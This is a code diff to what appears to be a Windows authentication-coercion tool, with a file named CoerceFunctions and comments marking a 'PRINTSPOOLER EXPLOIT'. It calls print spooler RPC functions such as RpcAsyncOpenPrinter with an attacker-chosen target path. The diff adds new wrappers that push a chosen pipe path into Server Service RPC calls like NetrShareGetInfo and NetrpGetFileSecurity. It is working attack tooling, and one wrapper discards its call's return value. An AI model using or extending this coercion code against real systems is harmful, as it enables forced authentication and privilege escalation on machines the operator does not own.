@@ -7,6 +7,7 @@
 #include "ms-efsr_h.h"
 #include "ms-rprn_h.h"
 #include "ms-par_h.h"
+#include "ms-srvsvc_h.h"
 #include "CoerceFunctions.h"
 
 
@@ -207,14 +208,14 @@ long callRpcRemoteFindFirstPrinterChangeNotification(wchar_t* targetedPipeName) 
     RpcExcept(EXCEPTION_EXECUTE_HANDLER);
     {
         hr = RpcExceptionCode();
-        wprintf(L"RPC Exception %d. ", hr);
+
     }
     RpcEndExcept;
-    return 0;
+    return hr;
 }
 
 long callRpcAsyncOpenPrinter(RPC_BINDING_HANDLE Binding, wchar_t* targetedPipeName) {
-    wprintf(L"[MS-RPRN] [*] Invoking RpcAsyncOpenPrinter with target path: %ws\r\n", targetedPipeName);
+    wprintf(L"[*] Invoking RpcAsyncOpenPrinter with target path: %ws\r\n", targetedPipeName);
     // RETRIEVING HOSTNAME. NECESSARY FOR PRINTSPOOLER EXPLOIT
     char computerName[MAX_COMPUTERNAME_LENGTH + 1];
     DWORD size = sizeof(computerName);
@@ -235,20 +236,18 @@ long callRpcAsyncOpenPrinter(RPC_BINDING_HANDLE Binding, wchar_t* targetedPipeNa
         // GETTING PRINTER HANDLE
 
         hr = RpcAsyncOpenPrinter(Binding, targetedPipeName, &hPrinter, pdatatype, &devmodeContainer, 0, NULL);
-        wprintf(L"Returned code error : %d \r\n", hr);
     }
     RpcExcept(EXCEPTION_EXECUTE_HANDLER);
     {
         hr = RpcExceptionCode();
-        wprintf(L"[MS-RPRN] [-] RPC Exception %d. ", hr);
     }
     RpcEndExcept;
-    return 0;
+    return hr;
 
 }
 
 long callRpcRemoteFindFirstPrinterChangeNotificationEx(wchar_t* targetedPipeName) {
-    wprintf(L"[MS-RPRN] [*] Invoking RpcRemoteFindFirstPrinterChangeNotificationEx with target path: %ws\r\n", targetedPipeName);
+    wprintf(L"[*] Invoking RpcRemoteFindFirstPrinterChangeNotificationEx with target path: %ws\r\n", targetedPipeName);
     // RETRIEVING HOSTNAME. NECESSARY FOR PRINTSPOOLER EXPLOIT
     char computerName[MAX_COMPUTERNAME_LENGTH + 1];
     DWORD size = sizeof(computerName);
@@ -256,8 +255,6 @@ long callRpcRemoteFindFirstPrinterChangeNotificationEx(wchar_t* targetedPipeName
     wchar_t* localhostComputerName;
     localhostComputerName = (wchar_t*)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
     StringCchPrintf(localhostComputerName, MAX_PATH, L"\\\\%hs", computerName);
-
-
 
     // INITIALIZING ALL PARAMETERS
     PRINTER_HANDLE hPrinter = NULL;
@@ -282,8 +279,83 @@ long callRpcRemoteFindFirstPrinterChangeNotificationEx(wchar_t* targetedPipeName
     RpcExcept(EXCEPTION_EXECUTE_HANDLER);
     {
         hr = RpcExceptionCode();
-        wprintf(L"[MS-RPRN] [-] RPC Exception %d. ", hr);
+        return hr;
     }
     RpcEndExcept;
     return 0;
+}
+
+
+long callNetrShareGetInfo(wchar_t* targetedPipeName) {
+    long result = 0;
+    DWORD level = 2;
+
+    wchar_t* serverName;
+    serverName = (wchar_t*)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
+    StringCchPrintf(serverName, MAX_PATH, L"localhost");
+
+    SHARE_INFO_2 InfoStruct;
+    memset(&InfoStruct, 0, sizeof(SHARE_INFO_2));
+
+    result = NetrShareGetInfo(serverName, targetedPipeName, level, (LPSHARE_INFO)&InfoStruct);
+
+    if (result != 0) {
+        std::cerr << "Erreur lors de l'appel à NetrShareGetInfo. Code d'erreur : " << result << std::endl;
+        // Gérer l'erreur selon vos besoins.
+    }
+    else {
+        wprintf(L"Nom : %ls\n", InfoStruct.shi2_netname);
+        wprintf(L"OK\n");
+    }
+
+    return result;
+}
+long callNetrShareCheck(wchar_t* targetedPipeName) {
+    long result = 0;
+
+    wchar_t* serverName;
+    serverName = (wchar_t*)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
+    StringCchPrintf(serverName, MAX_PATH, L"localhost");
+
+    DWORD Type;
+
+    result = NetrShareCheck(serverName, targetedPipeName, &Type);
+    wprintf(L"NetrShareCheck returned %lx\n", result);
+    return result;
+}
+
+long callNetprPathType(wchar_t* targetedPipeName) {
+    long result = 0;
+
+    wchar_t* serverName;
+    serverName = (wchar_t*)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
+    StringCchPrintf(serverName, MAX_PATH, L"localhost");
+
+    DWORD pathType;
+    DWORD flags = 0;
+
+    NetprPathType(serverName, targetedPipeName, &pathType, flags);
+    wprintf(L"NetprPathType returned %lx\n", result);
+    return result;
+}
+
+
+long callNetrpGetFileSecurity(wchar_t* targetedPipeName) {
+    long result = 0;
+
+    wchar_t* serverName;
+    serverName = (wchar_t*)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
+    StringCchPrintf(serverName, MAX_PATH, L"localhost");
+
+    wchar_t* lpFileName;
+    lpFileName = (wchar_t*)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
+    StringCchPrintf(lpFileName, MAX_PATH, L"poool2");
+
+    SECURITY_INFORMATION RequestedInformation = OWNER_SECURITY_INFORMATION | GROUP_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION;
+    PADT_SECURITY_DESCRIPTOR SecurityDescriptor = NULL;
+
+
+    result = NetrpGetFileSecurity(serverName, targetedPipeName, lpFileName, RequestedInformation, &SecurityDescriptor);
+    wprintf(L"NetrpGetFileSecurity returned %lx\n", result);
+    return result;
 }
